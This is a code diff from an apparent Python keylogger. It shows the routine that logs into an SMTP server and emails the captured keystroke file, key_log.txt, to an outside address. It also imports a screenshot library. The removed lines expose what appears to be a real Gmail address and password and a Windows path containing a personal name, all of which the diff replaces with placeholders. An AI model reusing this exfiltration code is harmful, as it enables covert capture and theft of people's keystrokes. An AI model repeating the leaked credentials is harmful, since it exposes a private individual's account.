@@ -28,20 +28,20 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 keys_information = "key_log.txt"
-email_address = "christian.yehle104@gmail.com"
-password = "Cyehle100495"
+email_address = "randomemailentry01@gmail.com"
+password = " simplePass"
 
 username = getpass.getuser()
 
-toaddr = "christian.yehle104@gmail.com"
+toaddr = "randomemailentry01@gmail.com"
 
 file_path = 'C:\\Users\\Christian Yehle\\Documents\\Logger'
 extend = "\\"
-file_merge = file_path +extend
+file_merge = file_path + extend
 
-#email controls
+
+# email controls
 def send_email(filename, attachment, toaddr):
-
     fromaddr = email_address
 
     msg = MIMEMultipart()
@@ -73,6 +73,7 @@ def send_email(filename, attachment, toaddr):
 
     s.starttls()
 
+
     s.login(fromaddr, password)
 
     text = msg.as_string()
@@ -80,6 +81,7 @@ def send_email(filename, attachment, toaddr):
     s.sendmail(fromaddr, toaddr, text)
 
     s.quit()
+
 
 send_email(keys_information, file_path + extend + keys_information, toaddr)
 
